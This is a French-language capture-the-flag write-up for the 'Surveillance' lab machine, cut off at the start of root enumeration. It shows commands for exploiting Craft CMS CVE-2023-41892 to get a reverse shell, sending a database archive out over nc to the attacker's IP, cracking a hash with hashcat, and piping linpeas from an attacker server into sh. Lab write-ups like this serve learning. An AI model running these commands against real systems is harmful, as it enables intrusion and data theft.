# Surveillance

## Process

On est lancer sur une adresse ip sur la quelle on a accés a un site web.
Aprés un `dirsearch` sur le domaine de la machines. On tombe sur un directory qui pourra nous etre utils: `/admin/login`

Une fois rajouter l'extension au domaine on tombe sur une page login sur la quelle on peut lire `craft CMS`.

Partons à la recherche d'une CVE de en rapport avec ce CMS.
On tombe sur la `CVE-2023-41892`.<br/>

En y allant un peu a l'aveugle on part à la recherche d'un exploit de cette cve et on tombe sur un git hub qui nous donne un script a executer je creer un fichier .py et entre le script a l'intérieur.

```bash
python3 cve-2023-41892.py http://surveillance.htb [mon-ip] 443
```

Tout en lançant avant cela un ncat:

```bash
nc -lvnp 443
```

En lançant le script celui ci me renvoi un shell sur le ncat.

Je lance directement:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Ce qui me donnent un shelle stable.

Aprés de multiple recherche des piste bien différente les une des autre des hash impossible a crack... je tombe sur un fichier zip que je décide de télécharger.

Je lance donc une commande nc pour recevoir un fichier avec un fichier de destination.

```bash
nc -lvnp 443 > db.zip
```

Puis je lance le téléchargement du fichier sur la machine distante prenans la destination puis le fichier a télécharger.

```bash
nc -w 3 [mon-ip] 443 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Maintenant que je l'ai recu je l'unzip et je vais analyser ce fichier.
Je trouve dans le fichier un hash dans la table `users`.
Je le copie et créer un fichier `hash.txt`.
Le type du hash aprés un rapide passage sur `hash analyzer`: est `SHA2-256` je lance donc un hascat:

```bash
hashcat -m1400 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked password: `***************`

On est donc connecter a la machines via le ssh!! Maintenant! 

## Root Flag

Bizarrement facile pour le user nous allons voir comment cela ce passe pour le root.

Donc pour commencer je décide de télécharger `linpeas` sur la machine afin de voir si celui ci trouve un fichier sur le quelle nous pourrions passer.

Je télécharge donc linpeas sur ma machines, [source](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Une fois télécharger je lance un serveur.

```bash
python3 -m http.server 80
```

En ouvrant ce serveur je peut lancer cette commande qui pourras donc en précisant l'ip et le chemin a suivre allé télécharger linpeas sur la machines distante.

```bash
curl [mon-ip]/home/user/Documents/outils/peass/linpeass.sh | sh
```

Maintenant qu'il est présent sur la machines je le lance.
On ne sait jamais avant de ce lancer dans une recherche interminable.🤞

Beaucoup de chose a analyser apparaissent c'est parti pour la recherche.<br/>

Note: Zoneminder est un logiciel de video surveillance, opensource.<br/>
voyons si l'on peut faire quelque chose avec ça.